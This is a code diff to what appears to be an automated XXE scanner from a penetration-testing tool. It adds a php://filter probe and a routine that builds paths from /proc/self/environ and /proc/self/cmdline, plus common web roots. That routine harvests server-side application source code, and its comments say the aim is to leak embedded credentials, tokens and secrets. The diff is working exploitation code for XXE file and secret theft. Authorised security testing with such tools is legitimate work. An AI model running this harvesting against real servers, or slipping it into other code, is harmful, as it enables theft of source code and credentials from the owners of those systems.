@@ -29,6 +29,8 @@ from lib.core.settings import XXE_ERROR_SIGNATURES
 from lib.core.settings import XXE_FILE_HARVEST
 from lib.core.settings import XXE_HARDENED_REGEX
 from lib.core.settings import XXE_IMPACT_FILES
+from lib.core.settings import XXE_SOURCE_NAMES
+from lib.core.settings import XXE_WEBROOTS
 from lib.core.settings import OOB_POLL_ATTEMPTS
 from lib.core.settings import OOB_POLL_DELAY
 from lib.core.settings import XXE_LOCAL_DTDS
@@ -274,6 +276,77 @@ def _harvestFiles(xml, rootName):
             seen.add(key)
             harvested.append((path, content, payload))
     return harvested
+
+
+def _phpFilterWorks(xml, rootName):
+    """One probe: can the target read a file via php://filter (i.e. is it PHP)? Gates
+    the PHP-only source-code sweep so a non-PHP target does not pay dozens of pointless
+    requests for it."""
+
+    from lib.core.convert import decodeBase64
+
+    m1, m2 = randomStr(8, lowercase=True), randomStr(8, lowercase=True)
+    ent = randomStr(8, lowercase=True)
+    subset = '<!ENTITY %s SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">' % ent
+    payload = _placeRef(_buildDoctype(xml, rootName, subset), "%s&%s;%s" % (m1, ent, m2))
+    match = re.search(re.escape(m1) + r"(.*?)" + re.escape(m2), getUnicode(_send(payload)), re.DOTALL)
+    if match and match.group(1).strip():
+        try:
+            return bool(getText(decodeBase64(match.group(1).strip())).strip())
+        except Exception:
+            pass
+    return False
+
+
+def _harvestSource(xml, rootName, harvested):
+    """PHP-only follow-up run once an in-band read primitive is confirmed: disclose
+    server-side application SOURCE code via php://filter (source is executed, never
+    rendered, yet its literals - credentials, tokens, embedded secrets - leak verbatim).
+    Candidate paths are derived from the already-harvested /proc/self/{cmdline,environ}
+    (running script + working dir) combined with common web roots/source names, and
+    de-duplicated against the host harvest by content. Skipped entirely on a non-PHP
+    target. Returns a list of (path, content, payload)."""
+
+    if not _phpFilterWorks(xml, rootName):
+        return []
+
+    byPath = dict((p, c) for p, c, _ in harvested)
+    seen = set(getUnicode(c).strip() for c in byPath.values())
+    candidates = []
+
+    dirs = []
+    environ = getUnicode(byPath.get("/proc/self/environ", ""))
+    match = re.search(r"(?:^|\x00)PWD=([^\x00]+)", environ)
+    cwd = match.group(1).strip() if match else None
+    if cwd:
+        dirs.append(cwd)
+    dirs += [_ for _ in XXE_WEBROOTS if _ != cwd]
+
+    cmdline = getUnicode(byPath.get("/proc/self/cmdline", ""))
+    for token in re.split(r"[\x00\s]+", cmdline):
+        if token and re.search(r"\.(?:php|py|rb|js|jsp|pl|cgi)$", token, re.I):
+            if token.startswith("/"):
+                candidates.append(token)                     # absolute script path
+            elif cwd:
+                candidates.append("%s/%s" % (cwd.rstrip("/"), token))
+
+    for directory in dirs:
+        for name in XXE_SOURCE_NAMES:
+            candidates.append("%s/%s" % (directory.rstrip("/"), name))
+
+    logger.info("attempting application source-code disclosure via php://filter")
+
+    result = []
+    read = set()
+    for path in candidates:
+        if path in read:
+            continue
+        read.add(path)
+        content, payload = _tryInbandFileRead(xml, rootName, path)
+        if content and content.strip() and getUnicode(content).strip() not in seen:
+            seen.add(getUnicode(content).strip())
+            result.append((path, content, payload))
+    return result
 
 
 def _tryInternal(xml, rootName, baseline):
@@ -716,7 +789,9 @@ def xxeScan():
             if harvested:
                 found = True
                 firstPath, _, firstPayload = harvested[0]
-                logger.info("in-band XXE file-read impact confirmed; harvested %d high-value file(s)" % len(harvested))
+                # follow-up: server-side application source disclosure (php://filter)
+                harvested += _harvestSource(xml, rootName, harvested)
+                logger.info("in-band XXE file-read impact confirmed; harvested %d file(s)" % len(harvested))
                 _report("In-band file read (auto-harvest, e.g. '%s')" % firstPath, firstPayload)
                 saved = []
                 for path, content, _ in harvested:
